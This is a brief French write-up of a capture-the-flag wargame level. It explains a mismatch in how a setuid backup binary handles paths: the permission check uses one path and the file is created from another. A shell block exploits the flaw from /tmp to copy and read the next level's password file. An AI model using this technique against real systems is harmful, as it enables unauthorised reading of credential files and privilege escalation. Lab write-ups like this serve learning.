En analysant le code, nous constatons que cela check les permissions pour ./backups/[argv[1]].
Cependant, au momemt de creer le file, cela prend uniquement argv[1].

Ainsi, nous avons simplement besoin d'etre dans un endroit ou nous pouvons creer, lire etc les files:

```shell
cd /tmp
mkdir -p backups/home/users/level09
touch backups/.log
../home/users/level08/level08 "/home/users/level09/.pass"
cat backups/home/users/level09/.pass
```

--> Nous avons notre flag pour passer au bonus !